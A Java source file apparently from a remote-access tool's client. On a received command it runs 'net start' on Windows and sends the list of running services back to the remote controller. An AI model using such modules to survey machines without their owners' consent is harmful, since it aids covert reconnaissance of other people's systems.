package com.redpois0n.packets;

import java.io.BufferedReader;
import java.io.InputStreamReader;

import com.redpois0n.Connection;
import com.redpois0n.common.os.OperatingSystem;


public class PacketLISTSER extends AbstractPacket {

	@Override
	public void read(String line) throws Exception {
		try {
			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
				Process p = Runtime.getRuntime().exec("net start");
				BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
				while ((line = reader.readLine()) != null) {
					if (line.startsWith(" ")) {
						Connection.addToSendQueue(new PacketBuilder(Header.WINDOWS_SERVICE, line.trim()));
					}
				}
				reader.close();
			} else {
				throw new Exception("Windows only");
			}
		} catch (Exception ex) {
			ex.printStackTrace();
			Connection.addToSendQueue(new PacketBuilder(Header.WINDOWS_SERVICE, "Error starting \"net start\" process: " + ex.getClass().getSimpleName() + ": " + ex.getMessage()));
		}
	}

}
